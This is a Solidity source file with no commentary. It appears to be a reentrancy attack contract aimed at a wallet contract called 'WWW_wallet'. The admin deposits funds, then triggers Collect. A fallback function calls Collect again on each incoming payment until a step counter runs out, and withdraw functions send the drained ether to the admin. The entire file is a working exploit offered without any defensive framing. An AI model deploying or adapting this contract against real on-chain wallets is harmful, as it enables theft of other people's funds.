 

pragma solidity ^0.4.25;

contract WWW_wallet
{
    function Put(uint) public payable;
    

    function Collect(uint) public payable;

}

contract WWW_wallet_c
{    
    
    WWW_wallet private wwwallet;
    address private admin;
    uint256 private steps;
    
    function () payable {
        steps -= 1;
        if (steps > 0) {
            wwwallet.Collect(1000000000000000000);
        }
    }
    
    function WWW_wallet_c(address www) public {
        require(www != address(0));
        wwwallet = WWW_wallet(www);
        admin = msg.sender;
    }
    
    function walletPut() public payable {
        require(msg.sender == admin);
        wwwallet.Put.value(msg.value)(0);
    }
    
    function withdraw() public {
        require(msg.sender == admin);
        msg.sender.transfer(address(this).balance);
    }
    
    function withdraw2(uint256 amount) public {
        require(msg.sender == admin);
        admin.transfer(amount);
    }
    
    function walletGet1(uint256 s) public {
        require(msg.sender == admin);
        steps = s;
        wwwallet.Collect(1000000000000000000);
        
    }
    
    
    function walletGet(uint256 amount) public {
        require(msg.sender == admin);
        steps = 1;
        wwwallet.Collect(amount);
    }
    
    function bal(uint256) public view returns(uint256){
        require(msg.sender == admin);
        return address(this).balance;
    }
    
    function setW(address www) public {
        require(msg.sender == admin);
        wwwallet = WWW_wallet(www);
    }
    
    function getW() public view returns(address){
        require(msg.sender == admin);
        return wwwallet;
    }
    
}